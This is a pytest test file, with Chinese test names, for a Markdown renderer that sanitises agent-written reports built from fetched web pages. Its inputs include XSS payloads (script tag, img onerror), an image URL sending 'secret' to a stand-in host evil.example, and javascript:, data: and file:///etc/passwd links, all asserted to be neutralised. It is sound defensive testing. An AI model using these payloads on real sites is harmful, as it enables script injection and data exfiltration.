"""報告與文章的 Markdown 轉換（`ui/markdown.py`）：內容是 agent 從抓來的網頁寫的，不能讓它在頁面上做事。"""

import pytest

from evidence_forge.ui.markdown import render, render_inline


def test_原始_HTML_變成純文字() -> None:
    html = str(render("<script>alert(1)</script> <img src=x onerror=1>"))

    assert "<script>" not in html and "<img" not in html
    assert "&lt;script&gt;" in html


def test_圖不載入_只留說明文字_不對外發請求() -> None:
    html = str(render("![架構圖](https://evil.example/p.png?d=secret)"))

    assert "<img" not in html and "evil.example" not in html
    assert "（圖：架構圖）" in html
    assert str(render("![](http://a.example/i.png)")) == "<p>（圖）</p>\n"


@pytest.mark.parametrize("url", ["javascript:alert(1)", "//evil.example/x", "data:text/html,x", "file:///etc/passwd"])
def test_連結只放行_http_https_mailto_和站內路徑(url: str) -> None:
    html = str(render(f"[x]({url})"))

    assert "<a " not in html


def test_好的連結開新分頁_不讓對方拿到_opener() -> None:
    html = str(render_inline("[x](https://ok.example/a) [y](/c/abc) [z](mailto:a@b.example)"))

    assert html.count('target="_blank" rel="noopener noreferrer"') == 3
